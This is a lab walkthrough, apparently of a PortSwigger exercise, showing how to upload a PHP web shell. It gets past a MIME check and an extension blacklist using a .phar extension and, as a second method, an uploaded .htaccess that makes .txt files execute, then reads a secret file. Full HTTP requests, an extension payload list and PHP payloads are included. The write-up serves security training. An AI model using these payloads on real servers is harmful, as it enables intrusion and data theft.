# Web shell upload via extension blacklist bypass

This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`

---

## 1. Detection

- Opened the Lab URL and clicked on <a href="/my-account?id=wiener">My Account</a> and logged in with given credentials `wiener:peter`.
- The page had option to upload an avatar.
- I uploaded a normal image file and captured the request in <a href="https://portswigger.net/burp/downloads">BurpSuite</a>.
- A `POST /my-account/avatar` was being sent, I right clicked on the request and sent it to `Repeater` tab to start playing with it.

```http
POST /my-account/avatar HTTP/2
Host: <REDACTED_HOST>
Cookie: session=<REDACTED_SESSION>
Content-Length: 529
Cache-Control: max-age=0
Sec-Ch-Ua: <REDACTED>
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: <REDACTED>
Dnt: 1
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryotTPzPfnxBJhA76G
User-Agent: <REDACTED>
Origin: <REDACTED_ORIGIN>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: <REDACTED_REFERER>
Accept-Encoding: gzip, deflate, br
Accept-Language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i

------WebKitFormBoundaryotTPzPfnxBJhA76G
Content-Disposition: form-data; name="avatar"; filename="test.txt"
Content-Type: text/plain

test
------WebKitFormBoundaryotTPzPfnxBJhA76G
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryotTPzPfnxBJhA76G
Content-Disposition: form-data; name="csrf"

<REDACTED_CSRF_TOKEN>
------WebKitFormBoundaryotTPzPfnxBJhA76G--
```

- I changed the file extension to `.txt` and set the content-type to `text/plain`, but the server rejected it with a `403 Forbidden`:

```http
HTTP/2 403 Forbidden
Date: Wed, 10 Jun 2026 10:52:31 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 224

Sorry, file type text/plain is not allowed
        Only image/jpeg and image/png are allowed
Sorry, there was an error uploading your file.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```

- This told me the server was validating the `Content-Type` header, not the actual file extension or content. So I kept the filename as `test.txt` but changed the part-level `Content-Type` to `image/png` and resent the request — the server accepted it and returned the upload path.

```http
HTTP/2 200 OK
Date: <REDACTED_DATE>
Server: <REDACTED_SERVER>
Vary: Accept-Encoding
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 132

The file avatars/test.txt has been uploaded.
<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```

- This confirms the server only checks the `Content-Type` header in the multipart form data — not the file extension or actual file content — which makes it trivially bypassable and opens the door to uploading arbitrary code.

---

## 2. Bypassing the Extension Blacklist

- With Content-Type spoofing confirmed, I moved to testing which PHP-executable extensions the server would actually parse. I sent the upload request to Burp **Intruder**, set the filename as `cat.§php§`, and used the following payload list:

```
.php
.php2
.php3
.php4
.php5
.php6
.php7
.php8
.phtml
.phtm
.phps
.pht
.phar
.phpt
.pgif
.shtml
```

- With the `Content-Type` set to `image/png` for all requests and the file body containing `<?php echo 1+1; ?>`, I launched the attack and observed the results.
- From the Intruder results, two extensions returned **403 Forbidden** — meaning they were explicitly blacklisted by the server:
  - `.php`
  - `.phtml`
- All other extensions returned **200 OK** and the file was accepted. However, visiting `/files/avatars/cat.<ext>` for each of those extensions (`.php2`, `.php3`, `.php4`, `.php5`, etc.) returned the raw PHP source code as plain text — meaning the server uploaded the file but did not execute it through the PHP interpreter.
- Only **`.phar`** was different — visiting `/files/avatars/cat.phar` returned `2`, confirming the PHP code was actually executed on the server.

---

## 3. Code Execution

- With `.phar` confirmed as executable, I uploaded the webshell by changing the filename to `cat.phar` and the body to a harmless arithmetic check:

```http
------WebKitFormBoundaryotTPzPfnxBJhA76G
Content-Disposition: form-data; name="avatar"; filename="cat.phar"
Content-Type: image/png

<?php
    echo 7*7;
?>
------WebKitFormBoundaryotTPzPfnxBJhA76G
```

- Visited `/files/avatars/cat.phar` and the server returned `49` — confirming live PHP execution.

---

## 4. Solve the Challenge

- I modified the payload to read the secret file:

```php
<?php
    echo file_get_contents('/home/carlos/secret');
?>
```

- Uploaded it again with the same `cat.phar` filename and visited `/files/avatars/cat.phar` — the server printed the flag:
`ZLIhun2cii05ApXIEKEq8N0zc6SUA5Kj`
- Submitted the flag and solved the lab.

---

## 5. Alternative Method — `.htaccess` Misconfiguration Abuse

This is an alternative approach to solving the same lab without relying on `.phar`. Instead of finding an executable extension, we instruct Apache itself to treat a harmless extension like `.txt` as PHP.

- In the same upload request in Repeater, I changed the filename to `.htaccess` and the `Content-Type` to `image/png` to bypass the MIME check. The body of the file contained:

```http
------WebKitFormBoundaryotTPzPfnxBJhA76G
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: image/png

AddType application/x-httpd-php .txt
------WebKitFormBoundaryotTPzPfnxBJhA76G
```

- This Apache directive tells the server to treat any `.txt` file inside the `avatars` directory as a PHP executable.
- The server accepted the upload. To confirm the `.htaccess` file actually landed, I visited `/files/avatars/.htaccess` — the server returned `403 Forbidden`, which is the expected behaviour for `.htaccess` files (Apache blocks direct access to them). This confirmed the file was successfully uploaded and in place.
- Next, I uploaded `exploit.txt` with the same Content-Type spoofing trick, with the PHP payload as the body:

```http
------WebKitFormBoundaryotTPzPfnxBJhA76G
Content-Disposition: form-data; name="avatar"; filename="exploit.txt"
Content-Type: image/png

<?php
    echo file_get_contents('/home/carlos/secret');
?>
------WebKitFormBoundaryotTPzPfnxBJhA76G
```

- Visited `/files/avatars/exploit.txt` — and instead of serving the raw text, the server executed it as PHP and printed the flag:
`ZLIhun2cii05ApXIEKEq8N0zc6SUA5Kj`
- Submitted the flag and solved the lab.

> **Why this works:** Apache processes `.htaccess` files per-directory. Since the server allowed uploading a file named `.htaccess` into the `avatars` directory, we were able to override Apache's configuration for that directory — making it execute `.txt` files as PHP, completely bypassing the extension blacklist.
